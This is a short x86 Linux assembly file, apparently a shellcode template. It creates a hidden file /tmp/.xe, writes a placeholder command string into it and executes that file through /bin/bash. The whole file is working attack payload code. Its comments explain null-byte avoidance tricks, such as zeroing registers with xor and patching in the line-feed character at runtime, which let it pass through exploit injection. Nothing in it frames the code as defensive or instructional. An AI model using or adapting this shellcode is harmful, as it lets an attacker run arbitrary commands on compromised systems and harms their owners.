
global _start

section .text
_start:
    
;65782e2f 706d742f = /tmp/.xe	
	
CreateFile:
	xor eax, eax		;zeroing
   	xor edx, edx	
   	push eax         	;NULL Byte as string terminator
   	push 0x65782e2f   	;name of file /tmp/.xe
   	push 0x706d742f       
   	mov ebx, esp       	;ebx point to pushed string
	mov esi, esp	   	; save the name of the file /tmp/.xe for a later use
	mov al,0x8		;create the file
	mov cl,077o		;with 77 permission (to avoid 0)
	int 0x80

	jmp CallPop

WriteString:            
	
	pop ecx			;get the string to write   	
	mov ebx,eax         	; copy returned value (fd) into ebx
	mov dl,0x09         	;now we put value $0x09 into dl (8 bits part)
   	inc  dl             	;0x09 + 1 == 0x0A, get the bad Line feed char
	mov byte [ecx+_R_POS_],dl    ;replace our R char with 0x0A
	
	xor edx,edx
	mov dl,_LEN_    	;len of the buffer
	mov al,0x04		;sys call
	int 0x80

CloseFile:
	xor eax,eax
        mov al, 0x6		;close the stream file
        int 0x80

ExecFile:
	xor eax, eax
	push eax
				; push ////bin/bash in reverse 
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f
	;prepare to execute the file through bash
	mov ebx,esp		;set the 1st arg /bin/bash from the stack
				;set up the args array
	push eax 		 ;null
	push esi 		 ;get the saved pointer to the /tmp/.xe file name
	push ebx 		 ;pointer to /bin/bash
	mov ecx, esp 		;set the args
	
	xor edx,edx		;null the forth parameter
	mov al, 0xb		;sys call 11
	int 0x80

CallPop:
 call  WriteString
 ;content of the file to be executed
 db "_CMD_"
